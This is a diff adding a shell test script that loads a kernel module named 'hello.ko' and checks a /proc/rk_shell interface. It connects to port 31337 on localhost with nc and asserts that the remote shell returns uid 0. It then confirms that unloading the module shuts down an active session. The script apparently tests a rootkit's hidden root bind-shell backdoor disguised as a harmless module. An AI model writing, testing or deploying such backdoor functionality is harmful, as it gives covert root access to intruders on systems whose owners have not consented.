@@ -1,0 +1,51 @@
+#!/bin/sh
+. /lib/check.sh
+
+begin "45-tcp-root-shell"
+
+ifconfig lo 127.0.0.1 up 2>/dev/null
+load hello.ko
+assert_loaded hello
+assert_exists /proc/rk_shell
+assert_contains /proc/rk_shell "port=31337"
+assert_contains /proc/rk_shell "sessions=0"
+assert_contains /proc/rk_shell "active=no"
+
+token="field_$$_$(date +%s)"
+printf 'printf "%s\\n"\nprintf "uid=%%s\\n" "$(id -u)"\nprintf "cwd=%%s\\n" "$PWD"\nexit\n' "$token" |
+    nc -w 3 127.0.0.1 31337 >/tmp/shell-session 2>&1
+
+assert_contains /tmp/shell-session "$token"
+if grep -q 'uid=0' /tmp/shell-session; then
+    _ok "remote shell has uid 0"
+else
+    _fail "remote shell did not report uid 0"
+fi
+if grep -q 'cwd=/' /tmp/shell-session; then
+    _ok "remote shell executed pwd"
+else
+    _fail "remote shell did not execute pwd"
+fi
+assert_contains /proc/rk_shell "sessions=1"
+assert_contains /proc/rk_shell "active=no"
+assert_absent /tmp/.rk_out
+
+# Keep a second shell blocked in read(), then prove unload shuts it down.
+mkfifo /tmp/rk_shell_input
+nc -w 10 127.0.0.1 31337 </tmp/rk_shell_input >/tmp/active-session 2>&1 &
+client_pid=$!
+exec 3>/tmp/rk_shell_input
+i=0
+while [ "$i" -lt 20 ]; do
+    grep -q '^active=yes$' /proc/rk_shell && break
+    sleep 0.1
+    i=$((i + 1))
+done
+assert_contains /proc/rk_shell "active=yes"
+
+unload hello
+exec 3>&-
+wait "$client_pid"
+assert_absent /proc/rk_shell
+rm -f /tmp/rk_shell_input
+summary
